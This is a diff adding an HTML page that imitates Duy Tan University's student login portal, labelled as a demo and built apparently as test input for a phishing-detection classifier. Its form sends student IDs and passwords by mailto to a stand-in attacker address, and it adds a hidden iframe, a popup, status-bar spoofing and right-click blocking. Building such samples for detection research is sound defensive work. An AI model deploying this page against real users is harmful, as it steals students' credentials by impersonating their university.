@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Đại học Duy Tân — Cổng đăng nhập sinh viên</title>
+<style>
+  /* ====== DEMO GIẢ LẬP — KHÔNG PHẢI TRANG CHÍNH THỨC CỦA ĐH DUY TÂN ====== */
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Arial, sans-serif; }
+  body { background:#f4f6f9; }
+
+  /* Thanh top màu đỏ đặc trưng DTU */
+  .topbar { background:#c8102e; color:#fff; padding:14px 40px; display:flex;
+            justify-content:space-between; align-items:center; }
+  .topbar .brand { font-size:22px; font-weight:700; letter-spacing:.5px; }
+  .topbar .brand span { color:#ffd700; }
+  .topbar .tagline { font-size:13px; opacity:.9; }
+
+  .nav { background:#0b2e5b; color:#fff; padding:10px 40px; font-size:14px; }
+  .nav a { color:#fff; text-decoration:none; margin-right:22px; }
+
+  .wrap { max-width:960px; margin:30px auto; padding:0 20px; display:flex; gap:30px; }
+  .intro { flex:1.4; }
+  .intro h1 { color:#0b2e5b; font-size:26px; margin-bottom:12px; }
+  .intro p { color:#444; line-height:1.7; margin-bottom:10px; }
+  .intro .notice { background:#fff3cd; border-left:5px solid #ffc107; padding:12px 14px;
+                   font-size:14px; color:#6b5300; border-radius:4px; }
+
+  /* Card đăng nhập */
+  .login-card { flex:1; background:#fff; border-radius:8px; box-shadow:0 4px 18px rgba(0,0,0,.12);
+                padding:28px; height:fit-content; }
+  .login-card h2 { color:#0b2e5b; font-size:20px; margin-bottom:6px; }
+  .login-card .sub { color:#888; font-size:13px; margin-bottom:20px; }
+  .field { margin-bottom:16px; }
+  .field label { display:block; font-size:13px; color:#333; margin-bottom:6px; }
+  .field input { width:100%; padding:11px 12px; border:1px solid #ccc; border-radius:5px; font-size:14px; }
+  .btn { width:100%; padding:12px; background:#c8102e; color:#fff; border:none; border-radius:5px;
+         font-size:15px; font-weight:600; cursor:pointer; }
+  .btn:hover { background:#a80d26; }
+  .foot { text-align:center; margin-top:14px; font-size:12px; color:#999; }
+
+  /* Watermark DEMO — cảnh báo đây là trang giả lập */
+  .demo-watermark { position:fixed; bottom:18px; right:18px; background:#c8102e; color:#fff;
+                    padding:8px 14px; border-radius:4px; font-size:13px; font-weight:700;
+                    box-shadow:0 2px 8px rgba(0,0,0,.3); z-index:999; }
+
+  footer { text-align:center; color:#aaa; font-size:12px; padding:24px 0; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="brand">ĐẠI HỌC <span>DUY TÂN</span></div>
+  <div class="tagline">Cổng thông tin sinh viên — Đà Nẵng, Việt Nam</div>
+</div>
+
+<div class="nav">
+  <a href="#">Trang chủ</a>
+  <a href="#">Đào tạo</a>
+  <a href="#">Sinh viên</a>
+  <a href="#">Thư viện</a>
+  <a href="#">Liên hệ</a>
+</div>
+
+<div class="wrap">
+  <div class="intro">
+    <h1>Chào mừng đến với cổng đăng nhập sinh viên</h1>
+    <p>Vui lòng đăng nhập bằng tài khoản sinh viên của bạn để truy cập hệ thống
+       quản lý học tập, xem điểm, đăng ký môn học và các dịch vụ trực tuyến khác.</p>
+    <div class="notice">
+      <strong>Lưu ý bảo mật:</strong> Đây là <u>trang giả lập phục vụ mục đích
+      nghiên cứu/demo</u>, không phải cổng đăng nhập chính thức của trường.
+      Không nhập thông tin thật vào trang này.
+    </div>
+  </div>
+
+  <div class="login-card">
+    <h2>Đăng nhập</h2>
+    <div class="sub">Sử dụng tài khoản sinh viên để tiếp tục</div>
+    <!-- Form hành động mailto: -> đặc trưng Submitting_to_email = 1 -->
+    <form action="mailto:attacker-collect@fake-mail.example" method="post">
+      <div class="field">
+        <label for="username">Mã sinh viên</label>
+        <input type="text" id="username" name="username" placeholder="VD: 1234567890" required>
+      </div>
+      <div class="field">
+        <label for="password">Mật khẩu</label>
+        <input type="password" id="password" name="password" placeholder="••••••••" required>
+      </div>
+      <button type="submit" class="btn">Đăng nhập</button>
+    </form>
+    <div class="foot"><a href="#">Quên mật khẩu?</a> &nbsp;|&nbsp; <a href="#">Trợ giúp</a></div>
+  </div>
+</div>
+
+<footer>&copy; 2026 Đại học Duy Tân — Trang giả lập demo</footer>
+
+<!-- Watermark DEMO -->
+<div class="demo-watermark">⚠️ DEMO GIẢ LẬP — KHÔNG PHẢI TRANG CHÍNH THỨC</div>
+
+<!-- ====== Các đặc trưng phishing để Perceptron phát hiện ====== -->
+
+<!-- iframe ẩn (frameborder=0) -> Iframe = 1 -->
+<iframe src="about:blank" style="display:none" frameborder="0" width="0" height="0"></iframe>
+
+<script>
+  // window.open -> popUpWidnow = 1
+  window.open("", "_blank");
+  // onmouseover thay đổi status bar -> on_mouseover = 1
+  window.onmouseover = function(){ window.status = "https://duytan.edu.vn/"; };
+  // vô hiệu hoá chuột phải -> RightClick = 1
+  document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
+</script>
+
+</body>
+</html>
